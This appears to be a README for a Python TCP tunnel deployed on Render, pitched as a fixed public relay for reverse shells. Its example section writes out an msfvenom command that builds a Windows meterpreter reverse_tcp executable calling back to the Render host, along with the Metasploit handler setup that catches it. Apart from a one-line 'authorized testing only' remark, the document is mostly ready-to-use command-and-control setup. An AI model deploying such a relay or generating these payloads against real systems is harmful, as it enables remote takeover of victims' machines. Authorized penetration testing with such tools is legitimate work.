# Simple TCP Tunnel Service

A minimal, display-only TCP tunnel service for exposing local services through Render - ideal for msfvenom testing and similar use cases.

## Files
- `tunnel_server.py` - Deploy to Render (server side)
- `tunnel_client.py` - Run on Debian/Ubuntu (client side, display-only)
- `start.sh` - Render startup script

## Overview
This service creates a **persistent TCP tunnel** through Render that:
- ✅ Maintains a fixed address/port (doesn't change like ngrok free tier)
- ✅ Runs in display-only mode on client (no input allowed)
- ✅ Shows live connection statistics
- ✅ Automatically reconnects on failure
- ✅ Uses token-based authentication
- ✅ Requires only Python standard library (no external dependencies)

## How It Works
```
[Your Local Service] 
    ↓ (localhost:PORT)
[tunnel_client.py]  ← Display-only, shows stats
    ↓ (TCP tunnel to Render)
[tunnel_server.py]  ← Runs on Render:PORT
    ↓
[Internet/Clients]
```

## Quick Start

### 1. Deploy to Render
1. Push this repository to GitHub
2. Create a new **Web Service** on Render
3. Connect your GitHub repository
4. Set:
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `./start.sh`
   - **Environment**: Python 3
5. Deploy the service

### 2. Get Your Token
After first deployment, check the logs for:
```
DEFAULT TUNNEL TOKEN (SAVE THIS):
your_unique_token_here
```
**Save this token** - you'll need it for the tunnel client.

### 3. Run Tunnel Client on Debian/Ubuntu
```bash
python3 tunnel_client.py \\
  --server your-service.onrender.com \\
  --token YOUR_TOKEN_FROM_LOGS \\
  --local-port 4444
```

### 4. Access Your Service
Connect to: `your-service.onrender.com:PORT` (where PORT is what Render assigned, usually 4444)
Traffic flows to your local service on localhost:LOCAL_PORT

## Example: msfvenom Testing

**After deploying to Render and getting your token:**

**On Debian/Ubuntu Machine:**
```bash
# Expose local metasploit listener on port 4444
python3 tunnel_client.py \\
  --server yourservice.onrender.com \\
  --token your_token_here \\
  --local-port 4444
```

**Generate msfvenom Payload:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=yourservice.onrender.com LPORT=4444 \\
  -f exe > payload.exe
```

**Set Up Metasploit Listener:**
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit
```

## Client Display Features
When running `tunnel_client.py`, you'll see a clean interface showing:
- 🟢 **Tunnel Status**: Active/Disconnected
- 📊 **Traffic Stats**: Bytes transferred in both directions
- ⏱️ **Connection Time**: How long tunnel has been active
- 🔄 **Auto-reconnect**: Shows reconnect attempts when needed
- 🚫 **Input Disabled**: Pure display mode - no command prompt

## Technical Details
- **Server**: Listens on `0.0.0.0:${PORT}` (uses Render's PORT env var)
- **Client**: Connects to server, forwards to `localhost:LOCAL_PORT`
- **Authentication**: Simple token validation (shown once in server logs)
- **Dependencies**: Python standard library only
- **Security**: For authorized testing only - keep your token secure

## Notes
- Token is displayed ONLY once in server logs (save it immediately!)
- For permanent token, set `TUNNEL_TOKEN` environment variable in Render
- No web interface, no dashboard - pure TCP tunnel only
- Optimized for reliability and simplicity
- Ideal for msfvenom, reverse shells, and local service exposure

---
*Simple TCP Tunnel Service - Ready for GitHub import*